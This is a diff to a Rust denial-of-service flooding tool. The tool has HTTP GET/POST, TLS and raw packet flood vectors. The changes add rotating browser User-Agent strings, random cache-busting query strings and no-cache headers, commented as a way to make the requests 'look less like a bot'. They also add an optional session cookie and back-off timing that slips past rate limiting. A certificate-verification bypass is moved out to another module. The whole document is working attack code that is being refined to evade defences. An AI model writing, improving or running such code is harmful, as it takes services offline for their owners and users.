@@ -6,7 +6,7 @@ use std::sync::Arc;
 use std::time::Duration;
 
 use rand::{Rng, SeedableRng};
-use tokio::io::AsyncWriteExt;
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::{TcpStream, UdpSocket};
 
 use crate::net::raw::{self, Iface, RawSock};
@@ -20,8 +20,18 @@ pub struct Ctx {
     pub iface: Option<Iface>,
     pub raw: Option<Arc<RawSock>>,
     pub stats: Arc<Stats>,
+    pub cookie: Option<String>,
     pub budgets: Vec<Arc<Budget>>,
 }
+
+const UA_POOL: [&str; 6] = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
+];
 
 /// Per-vector packet budget so one raw flood cannot starve the others or the
 /// L7 vectors. SYN floods are capped lowest because every SYN-ACK comes back
@@ -277,28 +287,57 @@ async fn async_worker(ctx: Arc<Ctx>, v: Vector, idx: usize) {
         }
         Vector::HttpGet | Vector::HttpPost => {
             let mut rng = rand::rngs::StdRng::from_entropy();
+            let cookie = ctx.cookie.clone();
             while ctx.stats.running() {
                 let Ok(mut s) = TcpStream::connect(addr).await else {
                     ctx.stats.error();
                     continue;
                 };
-                let path = format!("/?{}", rng.gen::<u64>());
-                let req = if v == Vector::HttpPost {
-                    let body = "x".repeat(rng.gen_range(64..512));
-                    format!(
-                        "POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
-                        body.len()
-                    )
+                // Random query string defeats edge caching; random UA and
+                // no-cache headers make the request look less like a bot.
+                let path = format!("/?{}={}", rng.gen::<u32>(), rng.gen::<u64>());
+                let ua = UA_POOL[rng.gen_range(0..UA_POOL.len())];
+                let body = if v == Vector::HttpPost {
+                    "x".repeat(rng.gen_range(64..512))
                 } else {
-                    format!(
-                        "GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: RustDoS\r\nAccept: */*\r\nConnection: close\r\n\r\n"
-                    )
+                    String::new()
                 };
+                let mut req = format!(
+                    "{} {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n",
+                    if v == Vector::HttpPost { "POST" } else { "GET" }
+                );
+                if v == Vector::HttpPost {
+                    req.push_str(&format!(
+                        "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n",
+                        body.len()
+                    ));
+                }
+                if let Some(c) = &cookie {
+                    req.push_str(&format!("Cookie: {c}\r\n"));
+                }
+                req.push_str("Connection: close\r\n\r\n");
+                req.push_str(&body);
+
                 let n = req.len();
-                if s.write_all(req.as_bytes()).await.is_ok() {
-                    ctx.stats.hit(idx, n);
-                } else {
+                if s.write_all(req.as_bytes()).await.is_err() {
                     ctx.stats.error();
+                    continue;
+                }
+                ctx.stats.hit(idx, n);
+
+                // Read just the status line so rate limiting can be detected.
+                let mut head = [0u8; 32];
+                let status = match tokio::time::timeout(
+                    Duration::from_millis(250),
+                    s.read(&mut head),
+                )
+                .await
+                {
+                    Ok(Ok(k)) if k > 0 => parse_status(&head[..k]),
+                    _ => 0,
+                };
+                if matches!(status, 429 | 403 | 503) {
+                    tokio::time::sleep(Duration::from_millis(rng.gen_range(40..160))).await;
                 }
                 drop(s);
             }
@@ -333,7 +372,7 @@ async fn async_worker(ctx: Arc<Ctx>, v: Vector, idx: usize) {
             }
         }
         Vector::TlsFlood => {
-            let Some(cfg) = tls_config() else {
+            let Some(cfg) = crate::tls::config() else {
                 return;
             };
             let server = host.clone();
@@ -394,54 +433,11 @@ fn dns_query(name: &str) -> Vec<u8> {
     v
 }
 
-// ------------------------------------------------------------------ tls
 
-fn tls_config() -> Option<Arc<rustls::ClientConfig>> {
-    use rustls::client::danger::{HandshakeSignatureValid, ServerCertVerified, ServerCertVerifier};
-    use rustls::pki_types::{CertificateDer, ServerName, UnixTime};
-    use rustls::{DigitallySignedStruct, SignatureScheme};
-
-    #[derive(Debug)]
-    struct NoVerify;
-
-    impl ServerCertVerifier for NoVerify {
-        fn verify_server_cert(
-            &self,
-            _e: &CertificateDer<'_>,
-            _i: &[CertificateDer<'_>],
-            _s: &ServerName<'_>,
-            _o: &[u8],
-            _n: UnixTime,
-        ) -> Result<ServerCertVerified, rustls::Error> {
-            Ok(ServerCertVerified::assertion())
-        }
-        fn verify_tls12_signature(
-            &self,
-            _m: &[u8],
-            _c: &CertificateDer<'_>,
-            _d: &DigitallySignedStruct,
-        ) -> Result<HandshakeSignatureValid, rustls::Error> {
-            Ok(HandshakeSignatureValid::assertion())
-        }
-        fn verify_tls13_signature(
-            &self,
-            _m: &[u8],
-            _c: &CertificateDer<'_>,
-            _d: &DigitallySignedStruct,
-        ) -> Result<HandshakeSignatureValid, rustls::Error> {
-            Ok(HandshakeSignatureValid::assertion())
-        }
-        fn supported_verify_schemes(&self) -> Vec<SignatureScheme> {
-            rustls::crypto::ring::default_provider()
-                .signature_verification_algorithms
-                .supported_schemes()
-        }
-    }
-
-    let _ = rustls::crypto::ring::default_provider().install_default();
-    let cfg = rustls::ClientConfig::builder()
-        .dangerous()
-        .with_custom_certificate_verifier(Arc::new(NoVerify))
-        .with_no_client_auth();
-    Some(Arc::new(cfg))
+fn parse_status(buf: &[u8]) -> u16 {
+    let s = String::from_utf8_lossy(buf);
+    s.split_whitespace()
+        .nth(1)
+        .and_then(|c| c.parse::<u16>().ok())
+        .unwrap_or(0)
 }
